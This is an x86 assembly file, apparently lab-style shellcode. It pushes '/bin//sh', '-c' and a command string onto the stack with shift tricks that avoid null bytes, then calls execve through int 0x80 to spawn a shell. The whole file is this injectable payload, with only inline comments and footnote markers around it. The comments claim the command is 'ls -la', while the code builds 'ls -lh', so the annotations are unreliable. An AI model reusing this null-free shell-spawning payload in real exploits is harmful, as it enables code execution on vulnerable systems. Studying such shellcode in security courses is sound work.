section .text
  global _start
    _start:
      ; Store the argument string on stack
      xor  eax, eax 
      push eax          ; Use 0 to terminate the string
      push "//sh"       ; [1]
      push "/bin"
      mov  ebx, esp     ; Get the string address

      ; Construct the argument array argv[]
      ; argv[3] = 0 
      ; argv[2] = "ls -la" 
      ; argv[1] = "-c"
      push eax
      
      ; we want "la  "
      mov esi, "lh##"
      shl esi, 16
      shr esi, 16 ; "la00"
      push esi
      ;mov esi, esp

      ; we want "ls -"
      push "ls -"
      mov ecx, esp
      
      ; we want "-c  "
      mov eax, "-c##"
      shl eax, 16
      shr eax, 16 ; "-c00"
      push eax
      mov edi, esp
      
      
      xor eax, eax
      push eax
      ;mov edx, esp
      ;push esi
      push ecx
      push edi

      ; argv[0] = "/bin/sh"
      push ebx          ; argv[0] points "/bin//sh"   [3]
      mov  ecx, esp     ; Get the address of argv[]
   
      ; For environment variable 
      xor  edx, edx     ; No env variables      [4]

      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80
